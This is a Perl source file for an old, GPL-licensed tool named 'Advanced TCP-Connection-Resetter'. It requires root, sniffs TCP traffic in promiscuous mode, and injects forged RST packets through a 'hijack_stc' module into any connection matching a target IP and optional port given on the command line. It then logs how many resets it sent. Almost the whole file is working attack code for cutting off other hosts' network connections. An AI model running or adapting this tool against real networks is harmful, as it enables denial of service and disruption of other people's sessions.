#!/usr/bin/perl
# Advanced TCP-Connection-Resetter
#
# Autor: stefan@krecher.de
# TheMidget
# Edited by Sergey S.S.
#           brahma@ua.fm
#
# Heavily updated by Bastian Ballmann [ Crazydj@chaostal.de ]
#
# Edited by Sergey S.S.
#           brahma@ua.fm
# Last Update: 22.12.2002
# Last Edit: 30.07.2004
#
# This program is free software; you can redistribute
# it and/or modify it under the terms of the
# GNU General Public License version 2 as published
# by the Free Software Foundation.
#
# This program is distributed in the hope that it will
# be useful, but WITHOUT ANY WARRANTY; without even
# the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE.
# See the GNU General Public License for more details.
############################################################################

# Are you root?
if($> != 0)
{
    die "You must be root...\n\n";
}


use hijack_stc;   # Hijacking stuff
use Net::PcapUtils; # Sniffin around



open cf, "</etc/stc.conf" or die "Can't open /etc/stc.conf: $!\n";
while($line=<cf>){
    chomp($line);
    $line=~ s/#.*//;
    $line=~ s/[\s\t]{1,}/ /;
    $line=~ s/^[\s\t]{0,}//;
    if (!$line){next;}
    @parts=split(" ", $line);
    $var=shift(@parts);
    @$var=@parts;
    $$var=$parts[0];
}
close (cf);
				    

###[ MAIN PART ]###


# Globale Variablen
my $connection;
my $sent=0;

# Standard Reset Flag
my $reset_flag = "rst";
my $time=time;

# Start the process
Net::PcapUtils::loop(\&process_pkt,
                     PROMISC => 1,
                     FILTER => 'tcp',
                     DEV => $ARGV[2],
             NUMPACKETS => -1) || die "Shit! There was an error!\n$!\n";

sub process_pkt {


  my($arg, $hdr, $pkt) = @_;


# Create a hijack object?
if($connection)
{
    $connection->update($pkt);
}
else
{
   $connection = hijack_stc->new($pkt);
   return;
}

if ($ARGV[1] > 0)
  {
    if ($connection->{src_ip} eq $ARGV[0] && $connection->{src_port} eq $ARGV[1])
       {
      	$connection->reset($reset_flag);
#        print "Send " . uc($reset_flag) . " $connection->{src_ip}:$connection->{src_port} --> $connection->{dest_ip}:$connection->{dest_port} SEQ: $connection->{seqnum}\n";
	$sent++;
#        exit(1);
	   }
   }
   else
   {
    if ($connection->{src_ip} eq $ARGV[0] )
       {
      	$connection->reset($reset_flag);
#        print "Send " . uc($reset_flag) . " $connection->{src_ip}:$connection->{src_port} --> $connection->{dest_ip}:$connection->{dest_port} SEQ: $connection->{seqnum}\n";
	$sent++;
#        exit(1);
	   }
    }
if ( (time()-$time) > $ARGV[3]) {
         $time_now=localtime;
          open LOG, ">>$log_file";
          print LOG "$time_now - Killing connection: ".$ARGV[0].":".$ARGV[1]."\n";
    if (!$sent) {$kill="RST packet not send. No activity.";}
    else {$kill="$sent RST packet(s) sent succesfully.";}
          $time_now=localtime;
          print LOG "$time_now - $kill\n";
          close LOG;
    exit($sent);
    }
}

